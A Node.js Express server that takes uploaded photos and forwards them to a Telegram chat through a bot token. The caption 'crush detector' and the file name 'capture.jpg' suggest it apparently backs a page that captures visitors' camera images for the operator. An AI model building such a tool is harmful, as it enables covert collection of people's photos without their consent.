const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for file uploads
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 }
});

// Serve static files
app.use(express.static(path.join(__dirname)));

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({
        message: 'Server working',
        env: {
            botToken: process.env.TELEGRAM_BOT_TOKEN ? 'SET' : 'NOT SET',
            chatId: process.env.TELEGRAM_CHAT_ID ? 'SET' : 'NOT SET'
        }
    });
});

// Send photo endpoint with detailed logging
app.post('/api/send-photo', upload.single('photo'), async (req, res) => {
    console.log('🔥 Photo request received');
    console.log('📷 File:', req.file ? 'Present' : 'Missing');
    console.log('🔑 Bot Token:', process.env.TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing');
    console.log('💬 Chat ID:', process.env.TELEGRAM_CHAT_ID ? 'Present' : 'Missing');
    
    if (!req.file) {
        console.log('❌ No file in request');
        return res.status(400).json({ error: 'No photo file' });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken) {
        console.log('❌ Missing bot token');
        return res.status(500).json({ error: 'Bot token missing' });
    }

    if (!chatId) {
        console.log('❌ Missing chat ID');
        return res.status(500).json({ error: 'Chat ID missing' });
    }

    try {
        // Use simple fetch approach
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', new Blob([req.file.buffer]), 'capture.jpg');
        formData.append('caption', '📸 Test photo from crush detector');

        console.log('🚀 Sending to Telegram...');
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await response.text();
        console.log('📱 Telegram response:', result);

        if (response.ok) {
            console.log('✅ Success!');
            res.json({ success: true, message: 'Photo sent successfully' });
        } else {
            console.log('❌ Telegram error:', result);
            res.status(500).json({ error: 'Telegram API error', details: result });
        }

    } catch (error) {
        console.error('💥 Error:', error);
        res.status(500).json({ error: 'Server error', details: error.message });
    }
});

// Default route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Bot token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured' : 'Missing'}`);
    console.log(`💬 Chat ID: ${process.env.TELEGRAM_CHAT_ID ? 'Configured' : 'Missing'}`);
});
